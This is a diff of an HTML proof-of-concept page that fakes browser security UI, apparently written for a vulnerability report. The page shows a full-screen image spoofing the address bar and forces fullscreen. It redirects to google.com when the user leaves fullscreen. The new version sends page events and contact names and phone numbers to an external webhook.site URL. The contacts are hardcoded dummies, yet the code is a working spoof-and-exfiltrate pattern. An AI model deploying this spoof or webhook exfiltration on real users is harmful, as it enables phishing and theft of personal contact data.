@@ -1,10 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <title>Security UI Spoof – UX Demo</title>
   <meta charset="utf-8">
-  <meta name="viewport"
-        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+  <title>Contacts Picker Demo (Safe PoC)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
   <style>
     html, body {
@@ -14,7 +13,7 @@
       height: 100%;
       background: #000;
       font-family: sans-serif;
-      overflow: hidden;
+      color: #fff;
     }
 
     #spoof {
@@ -25,44 +24,24 @@
       object-fit: cover;
       display: none;
       z-index: 9999;
-      pointer-events: none;
     }
 
     #content {
-      position: absolute;
-      inset: 0;
+      height: 100%;
       display: flex;
       align-items: center;
       justify-content: center;
-      color: #fff;
       text-align: center;
-      z-index: 1;
+      padding: 20px;
     }
 
-    #logArea {
-      position: fixed;
-      bottom: 0;
-      left: 0;
-      width: 100%;
-      max-height: 35vh;
-      overflow-y: auto;
-      background: rgba(0,0,0,.75);
-      color: #0f0;
-      font-size: 12px;
-      font-family: monospace;
-      padding: 8px;
-      z-index: 10000;
-      white-space: pre-wrap;
-      box-sizing: border-box;
-    }
-
-    #saveBtn {
-      position: fixed;
-      top: 10px;
-      right: 10px;
-      z-index: 10001;
-      padding: 8px 12px;
-      font-size: 12px;
+    button {
+      padding: 16px 24px;
+      font-size: 18px;
+      border: none;
+      border-radius: 8px;
+      background: #1a73e8;
+      color: #fff;
     }
   </style>
 </head>
@@ -72,98 +51,73 @@
 <img id="spoof" src="spof2.png" alt="spoof">
 
 <div id="content">
-  <h1>Click anywhere on the page to spoof the omnibox!</h1>
+  <div>
+    <h1>Click anywhere to start demo</h1>
+    <button id="start">Open Contacts</button>
+  </div>
 </div>
 
-<button id="saveBtn">Save Logs</button>
-<div id="logArea">[LOG INIT]</div>
-
 <script>
-let enteredFullscreen = false;
+const WEBHOOK = "https://webhook.site/c28e63ae-558e-47e6-84d1-3ca7c07cacc4";
 
-/* Logger */
-function logEvent(type, data = {}) {
-  const entry = {
-    time: new Date().toISOString(),
-    type,
-    ...data
-  };
-
-  const logs = JSON.parse(localStorage.getItem('poc_logs') || '[]');
-  logs.push(entry);
-  localStorage.setItem('poc_logs', JSON.stringify(logs));
-
-  const logArea = document.getElementById('logArea');
-  logArea.textContent += `\n${entry.time} | ${type} ${JSON.stringify(data)}`;
-  logArea.scrollTop = logArea.scrollHeight;
-
-  console.log('[LOG]', entry);
+function sendToWebhook(data) {
+  fetch(WEBHOOK, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data)
+  }).catch(() => {});
 }
 
-/* Main action */
-document.addEventListener('click', async () => {
+function dummyContacts() {
+  return [
+    { name: "John Doe", phone: "+628123456789" },
+    { name: "Jane Doe", phone: "+628987654321" }
+  ];
+}
 
-  /* Contacts Picker */
-  if (navigator.contacts && navigator.contacts.select) {
-    logEvent('contacts_picker_called');
+document.getElementById("start").addEventListener("click", async () => {
 
-    navigator.contacts.select(["name"], {})
-      .then(result => {
-        logEvent('contacts_picker_closed', {
-          granted: true,
-          count: result.length
-        });
-      })
-      .catch(err => {
-        logEvent('contacts_picker_closed', {
-          granted: false,
-          reason: err.name
-        });
-      });
-  } else {
-    logEvent('contacts_api_not_supported');
-  }
+  // 1️⃣ Simulate contacts picker opened
+  sendToWebhook({
+    event: "contacts_picker_opened",
+    time: new Date().toISOString()
+  });
 
-  /* Show spoof */
-  document.getElementById('spoof').style.display = 'block';
-  document.getElementById('content').style.display = 'none';
-  logEvent('spoof_shown');
+  // 2️⃣ Show spoof overlay
+  document.getElementById("spoof").style.display = "block";
+  document.getElementById("content").style.display = "none";
 
-  /* Enter fullscreen */
+  // 3️⃣ Request fullscreen (if allowed)
   if (document.documentElement.requestFullscreen) {
-    try {
-      await document.documentElement.requestFullscreen();
-      enteredFullscreen = true;
-      logEvent('entered_fullscreen');
-    } catch (e) {
-      logEvent('fullscreen_failed', { error: e.message });
-    }
+    document.documentElement.requestFullscreen().catch(() => {});
   }
 
-}, { once: true });
+  // 4️⃣ Simulate user selecting contacts
+  setTimeout(() => {
+    const contacts = dummyContacts();
 
-/* Exit fullscreen → delayed redirect */
-document.addEventListener('fullscreenchange', () => {
-  if (enteredFullscreen && !document.fullscreenElement) {
-    logEvent('exit_fullscreen_detected');
-
-    setTimeout(() => {
-      logEvent('redirect_to_google');
-      location.href = 'https://google.com';
-    }, 1200); // delay smooth
-  }
+    sendToWebhook({
+      event: "contacts_selected",
+      contacts,
+      time: new Date().toISOString()
+    });
+  }, 1200);
 });
 
-/* Save logs */
-document.getElementById('saveBtn').onclick = () => {
-  const data = localStorage.getItem('poc_logs') || '[]';
-  const blob = new Blob([data], { type: 'application/json' });
-  const a = document.createElement('a');
-  a.href = URL.createObjectURL(blob);
-  a.download = 'poc_logs.json';
-  a.click();
-  logEvent('logs_saved');
-};
+// 5️⃣ Detect exit fullscreen → redirect fast
+document.addEventListener("fullscreenchange", () => {
+  if (!document.fullscreenElement) {
+    sendToWebhook({
+      event: "exit_fullscreen",
+      time: new Date().toISOString()
+    });
+
+    // redirect cepat
+    setTimeout(() => {
+      location.href = "https://google.com";
+    }, 50);
+  }
+});
 </script>
 
 </body>
